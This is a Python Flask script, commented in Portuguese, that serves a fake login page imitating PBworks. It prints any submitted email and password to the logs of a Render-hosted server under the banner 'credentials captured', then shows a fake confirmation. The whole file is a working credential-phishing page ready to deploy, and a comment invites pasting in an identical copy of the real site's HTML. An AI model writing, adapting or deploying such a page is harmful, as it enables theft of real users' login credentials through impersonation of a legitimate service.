from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# Esta parte roda quando a pessoa entra na página de login
@app.route('/login.html', methods=['GET'])
@app.route('/', methods=['GET'])
def pagina_login():
    # Aqui você pode colar o código HTML da sua página verde idêntica do PBworks
    # Para o teste, usamos uma estrutura base simplificada:
    return """
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>Log in to My PBworks</title></head>
    <body style="background:#5c964e; font-family:Arial; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
        <div style="background:white; padding:40px; border-radius:4px; width:300px; text-align:center;">
            <h2>Please log in</h2>
            <form action="/" method="POST">
                <input type="text" name="email" placeholder="Email address" style="width:100%; padding:8px; margin:10px 0;" required><br>
                <input type="password" name="password" placeholder="Password" style="width:100%; padding:8px; margin:10px 0;" required><br>
                <button type="submit" style="padding:6px 15px; font-weight:bold; cursor:pointer;">Log in</button>
            </form>
        </div>
    </body>
    </html>
    """

# Esta parte roda no exato segundo em que a pessoa clica no botão "Log in"
@app.route('/', methods=['POST'])
def capturar_dados():
    # O Flask puxa os dados do formulário automaticamente
    email = request.form.get('email')
    senha = request.form.get('password')
    
    # EXIBE OS DADOS NOS LOGS DO PAINEL DO RENDER
    print("\n" + "="*50)
    print("🚨 MONITOR EM NUVEM: CREDENCIAIS CAPTURADAS! 🚨")
    print(f"📧 E-mail / Usuário: {email}")
    print(f"🔑 Senha Digitada:   {senha}")
    print("="*50 + "\n")
    
    return "<h1>✅ Autenticação Processada. Dados validados no monitor em nuvem.</h1>"

if __name__ == '__main__':
    # O Render define a porta automaticamente através da variável PORT
    porta = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=porta)
